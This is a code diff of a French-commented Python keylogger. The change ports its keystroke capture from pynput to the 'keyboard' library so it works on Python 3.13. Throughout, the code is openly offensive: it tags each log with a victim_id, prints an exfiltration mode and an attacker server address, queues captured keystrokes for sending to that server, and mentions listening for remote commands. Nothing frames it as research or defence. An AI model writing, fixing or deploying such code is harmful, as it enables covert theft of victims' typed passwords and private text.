@@ -14,9 +14,9 @@ from threading import Thread
 import os
 
 try:
-    from pynput import keyboard
+    import keyboard as kb
 except ImportError:
-    print("Erreur: pynput n'est pas installé. Exécutez: pip install -r requirements.txt")
+    print("Erreur: keyboard n'est pas installé. Exécutez: pip install -r requirements.txt")
     exit(1)
 
 import config
@@ -35,42 +35,48 @@ class Keylogger:
         print(f"[+] Mode d'exfiltration: {self.mode}")
         print(f"[+] Serveur cible: {config.ATTACKER_IP}:{config.ATTACKER_PORT}")
     
-    def normalize_key(self, key):
+    def normalize_key(self, event):
         """
         Normalise les touches capturées en chaînes de caractères lisibles
         """
         try:
+            # keyboard retourne un objet event avec event.name et event.event_type
+            if event.event_type == kb.KEY_UP:
+                return None  # On ignore les KEY_UP, on ne capture que KEY_DOWN
+            
+            key_name = event.name
+            
             # Touches spéciales
             special_keys = {
-                keyboard.Key.space: ' ',
-                keyboard.Key.enter: '\n',
-                keyboard.Key.tab: '\t',
-                keyboard.Key.backspace: '[BACKSPACE]',
-                keyboard.Key.delete: '[DELETE]',
-                keyboard.Key.shift: '[SHIFT]',
-                keyboard.Key.ctrl: '[CTRL]',
-                keyboard.Key.alt: '[ALT]',
-                keyboard.Key.esc: '[ESC]',
-                keyboard.Key.up: '[UP]',
-                keyboard.Key.down: '[DOWN]',
-                keyboard.Key.left: '[LEFT]',
-                keyboard.Key.right: '[RIGHT]',
+                'space': ' ',
+                'enter': '\n',
+                'tab': '\t',
+                'backspace': '[BACKSPACE]',
+                'delete': '[DELETE]',
+                'shift': '[SHIFT]',
+                'ctrl': '[CTRL]',
+                'alt': '[ALT]',
+                'esc': '[ESC]',
+                'up': '[UP]',
+                'down': '[DOWN]',
+                'left': '[LEFT]',
+                'right': '[RIGHT]',
             }
             
-            if key in special_keys:
-                return special_keys[key]
+            if key_name in special_keys:
+                return special_keys[key_name]
             
-            # Touches avec caractères
-            if hasattr(key, 'char') and key.char:
-                return key.char
+            # Touches avec caractères (si c'est un caractère simple)
+            if len(key_name) == 1:
+                return key_name
             
-            # Autres touches
-            return str(key).replace('Key.', '')
+            # Autres touches (retourner le nom)
+            return f'[{key_name}]'
         
         except Exception as e:
             return f"[KEY_ERROR:{str(e)}]"
     
-    def on_press(self, key):
+    def on_press(self, event):
         """
         Callback appelé à chaque frappe de touche
         """
@@ -78,12 +84,15 @@ class Keylogger:
             return
         
         try:
-            normalized_key = self.normalize_key(key)
+            normalized_key = self.normalize_key(event)
+            if normalized_key is None:
+                return  # Ignorer les KEY_UP
+            
             log_entry = {
                 "victim_id": self.victim_id,
                 "timestamp": datetime.now().isoformat(),
                 "key": normalized_key,
-                "raw_key": str(key)
+                "raw_key": event.name
             }
             
             # Ajouter à la queue et au buffer
@@ -359,33 +368,19 @@ class Keylogger:
         print("[+] Écoute des commandes distantes activée")
         
         try:
-            # Écouter les frappes
-            with keyboard.Listener(on_press=self.on_press, suppress=False) as listener:
-                listener.join()
+            # Écouter les frappes avec keyboard (compatible Python 3.13)
+            kb.on_press(self.on_press)
+            kb.wait()  # Bloque jusqu'à interruption
         
         except KeyboardInterrupt:
             print("\n[!] Arrêt du keylogger...")
             self.stop_capture()
+            kb.unhook_all()  # Nettoyer les hooks
             print("[+] Keylogger arrêté")
         except Exception as e:
-            # Gérer les erreurs de pynput (notamment avec Python 3.13)
-            if "ThreadHandle" in str(e) or "not callable" in str(e):
-                print(f"[!] Erreur connue avec pynput/Python 3.13: {e}")
-                print("[!] Solution: Utilisez Python 3.12 ou 3.11")
-                print("[!] Le keylogger continue en mode dégradé...")
-                # Continuer à envoyer les logs déjà capturés
-                while True:
-                    time.sleep(config.SEND_INTERVAL)
-                    if not self.capturing:
-                        break
-                    logs_to_send = []
-                    while not self.log_queue.empty():
-                        logs_to_send.append(self.log_queue.get())
-                    if logs_to_send:
-                        self.send_logs(logs_to_send)
-            else:
-                print(f"[-] Erreur inattendue: {e}")
-                self.stop_capture()
+            print(f"[-] Erreur inattendue: {e}")
+            self.stop_capture()
+            kb.unhook_all()
 
 
 if __name__ == "__main__":
